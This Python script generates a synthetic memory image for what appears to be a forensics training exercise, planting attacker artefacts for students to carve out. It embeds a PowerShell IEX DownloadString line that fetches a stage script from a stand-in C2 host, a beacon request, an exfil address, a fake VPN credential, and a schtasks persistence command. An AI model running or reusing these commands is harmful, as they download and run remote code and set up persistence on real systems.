#!/usr/bin/env python3
"""Generate memory.raw — a RAM-triage artefact for M6.

A full Volatility-parseable image can't be synthesised by hand, so this models
the *other* real memory-triage path: carving readable strings and features out
of a raw dump with `strings`, `grep` and `bulk_extractor` when you don't yet
have a Volatility profile. Planted artefacts: the malicious process command
line, a C2 URL, an exfil email, an in-memory plaintext credential and a mutex.
Deterministic, pure stdlib.
"""
import os
from pathlib import Path

_C2=os.environ.get('CAIC_C2_DOMAIN','beacon.sync-malware-c2.net')
_VPN=os.environ.get('CAIC_VPN_PASS','S3cr3tVPN!2026')
_EXF=os.environ.get('CAIC_EXFIL_EMAIL','exfil-drop@attacker-mail.ru')

PLANTS = [
    b"C:\\Windows\\Temp\\svch0st.exe -nop -w hidden -enc BASE64BLOBREDACTED",
    ("IEX(New-Object Net.WebClient).DownloadString('http://"+_C2+"/stage.ps1')").encode(),
    ("GET http://"+_C2+"/gate.php?id=FIN03 HTTP/1.1").encode(),
    _EXF.encode(),
    ("vpnadmin:"+_VPN).encode(),
    b"Global\\svch0st_mtx_7f3a",
    b"cmd.exe /c schtasks /create /tn WindowsUpdateSvc /tr C:\\Windows\\Temp\\svch0st.exe /sc minute",
]


def build(size: int = 2_000_000) -> bytes:
    # Deterministic pseudo-"memory": zero pages with the planted strings scattered
    buf = bytearray(size)
    # some benign-looking noise strings too, so grep has to be used thoughtfully
    noise = [b"explorer.exe", b"svchost.exe -k netsvcs", b"C:\\Program Files\\",
             b"HKLM\\SOFTWARE\\Microsoft\\Windows", b"ntdll.dll", b"kernel32.dll"]
    pos = 4096
    for s in noise * 50:
        buf[pos:pos + len(s)] = s
        pos += 311
        if pos > size - 4096:
            pos = 8192
    # plant the real artefacts at spread-out offsets
    step = size // (len(PLANTS) + 1)
    for i, s in enumerate(PLANTS, start=1):
        off = i * step
        buf[off:off + len(s)] = s
    return bytes(buf)


def main() -> int:
    out = Path(__file__).resolve().parent / "memory.raw"
    out.write_bytes(build())
    print(f"wrote {out} ({out.stat().st_size} bytes)")
    print("  carve with:  strings memory.raw | grep -iE 'http|\\.ps1|exe|:'")
    print("               bulk_extractor -o be_out memory.raw   (then read url.txt, email.txt)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
